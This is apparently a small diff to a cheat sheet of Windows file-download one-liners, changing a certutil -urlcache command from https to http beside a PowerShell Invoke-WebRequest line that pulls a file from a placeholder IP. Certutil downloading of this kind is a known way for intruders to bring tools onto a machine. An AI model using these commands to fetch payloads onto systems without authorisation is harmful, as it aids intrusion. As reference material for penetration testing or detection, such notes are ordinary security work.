@@ -1,5 +1,5 @@
 CERTUTIL
-certutil -urlcache -split -f "https://url/file" file
+certutil -urlcache -split -f "http://url/file" file
 
 POWERSHELL
 powershell -c "Invoke-WebRequest -Uri 'http://ip/file' -OutFile 'path'" # just download
